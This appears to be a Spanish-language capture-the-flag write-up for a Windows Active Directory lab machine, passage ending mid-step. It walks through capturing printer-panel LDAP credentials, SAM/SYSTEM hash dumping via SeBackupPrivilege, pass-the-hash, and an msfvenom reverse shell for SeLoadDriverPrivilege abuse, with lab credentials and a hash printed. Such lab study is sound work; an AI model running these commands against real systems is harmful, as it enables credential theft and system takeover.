
# Reconocimiento

```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.95.241 -oG allPorts
```

```shell
[*] IP Address: 10.129.95.241
[*] Open ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49671,49674,49675,49678,49681,49694
```

```shell
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49671,49674,49675,49678,49681,49694 -sCV 10.129.95.241 -oN targeted
```

```shell
nxc smb 10.129.95.241
```


## HTTP
Al encontrar el puerto `80` abierto, podemos acceder a el y encontramos el panel de administración de una impresora en el cual nos deja modificar valores, encontrando el addres `printer.return.local`. el server port `389` el username `svc-printer` y el campo password `****` el cual parece que se puede modificar

Al dejarnos modificar los valores vamos a poner en el `Server Address` nuestra IP y nos pondremos en escucha con [[NETCAT]]
```shell
nc -nlvp 389
```

Obteniendo las credenciales en texto claro
```ad-hint
svc-printer::1edFg43012!!
```

Vamos a validarlas contra el servidor usando [[NETEXEC]]
```shell
nxc smb 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

Vemos que si que son validas, probamos a enumerar si el usuario pertenece al grupo de `Remote Management` usando [[NETEXEC]]
```shell
nxc winrm 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

Obteniendo como resultado que el usuario es perteneciente a este grupo pudiéndonos conectarnos así mediante [[EVIL-WINRM]]
```shell
evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

# Escalada de privilegios
Para enumerar los privilegios que tiene nuestro usuario usaremos 
```shell
whoami /priv
```

Encontramos los privilegios de `SeBackupPrivilege` 
Este privilegio nos deja leer cualquier archivo del sistema sin importar los permisos de la ACL. Pudiendo llegar a realizar una explotación de `Credentiasl Dumping`

## SeBackupPrivilege -> Credential Dumping
En esta explotación extraemos la `SAM` y `SYSTEM` para desde fuera con [[IMPACKET]] poder interceptar los hashes que había en la maquina y poder elevar nuestros privilegios

- Primero deberemos crear un directorio `/temp` 
	```shell
	mkdir C:\temp
	```

- Segundo se copia la `sam` al directorio `/temp` que hemos creado y copiamos también el de  `system` guardándolo en nuestro `/temp`
```shell
reg save hklm\sam C:\temp\sam.hive
```

```shell
reg save hklm\system C:\temp\system.hive
```

- Tercero pasamos el archivo `sam` y `system`  a nuestra maquina atacante con 
```shell
download sam.hive
```

 ```shell
 download system.hive
 ```

 Usaremos [[IMPACKET]] pasándole las opciones de 
 - `-sam` para pasarle la `SAM` descargada
 - `-system` para pasarle el `SYSTEM` descargado
 - `LOCAL` para obtener los hashes de forma offline
  ```shell

  impacket-secretsdump -sam sam.hive -system system.hive LOCAL
  ```

Obteniendo así el hash del usuario administrador 

```ad-hint
Administrator::34386a771aaca697f447754e4863d38a
```

Probaremos a conectarnos con el a través de [[EVIL-WINRM]]
```shell
evil-winrm -i 10.129.95.241 -u Administrator -H 34386a771aaca697f447754e4863d38a
```

Pero en este caso nos esta rechazando la conexión así que la escalada de privilegios lleva otro camino

También tenemos privilegios en `SeLoadDriverPrivilege`

## SeLoadDriverPrivilege
Este privilegio nos permite cargar y descargar drivers, permitiéndonos subir un driver malicioso y al ser ejecutado en el kernel poder obtener acceso como `ADministrator`

Para esta explotación usaremos `https://github.com/JoshMorrison99/SeLoadDriverPrivilege`

Nos clonamos el repositorio
```shell
git clone https://github.com/JoshMorrison99/SeLoadDriverPrivilege.git
```

Nos creamos una `Reverse Shell` con [[MSFVENOM]]
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.165 LPORT=4444 -f exe -o rev.exe
```

Nos subimos los ficheros del repositorio clonado a la maquina victima con
```shell
upload ./SeLoadDriverPrivilege/*
```

Subimos también nuestra shell
```shell
upload rev.exe
```

Nos ponemos en escucha en el puerto `4444`

